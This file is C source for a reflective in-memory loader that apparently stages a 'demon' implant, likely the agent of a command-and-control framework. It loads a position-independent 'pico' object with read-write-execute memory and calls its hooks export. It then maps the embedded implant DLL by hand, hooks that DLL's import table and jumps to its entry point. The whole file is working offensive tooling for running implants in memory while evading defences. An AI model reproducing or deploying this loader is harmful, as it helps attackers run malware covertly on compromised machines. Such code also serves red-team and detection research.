#include "loader.h"

char __DEMONDATA__[0]   __attribute__( ( section( "demon" ) ) );
char __PICO__[0]        __attribute__( ( section( "pico" ) ) );

typedef void ( *HOOKS_INITIALIZE_FUNC )( IMPORTFUNCS* );

int __tag_hooks_initialize();

void go() {
    IMPORTFUNCS             funcs;
    char*                   demon_src = (char*)__DEMONDATA__;
    char*                   demon_code;
    DLLDATA                 demon_data;
    char*                   pico_src = __PICO__;
    char*                   pico_code;
    char*                   pico_data;
    HOOKS_INITIALIZE_FUNC   hooks_initialize;
    
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;

    // load pico
    pico_data = VirtualAlloc( NULL, PicoDataSize( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
    pico_code = VirtualAlloc( NULL, PicoCodeSize( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
    PicoLoad( &funcs, pico_src, pico_code, pico_data );

    // call PICO export "HooksInitialize"
    hooks_initialize = (HOOKS_INITIALIZE_FUNC)PicoGetExport( pico_src, pico_code, __tag_hooks_initialize() );
    hooks_initialize(&funcs);

    // load demon
    ParseDLL( demon_src, &demon_data );
    demon_code = VirtualAlloc( NULL, SizeOfDLL( &demon_data ), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
    LoadDLL( &demon_data, demon_src, demon_code );

    // hook demon IAT
    ProcessImports( &funcs, &demon_data, demon_code );

    // call demon entrypoint
    EntryPoint( &demon_data, demon_code )( NULL, 0, NULL );
}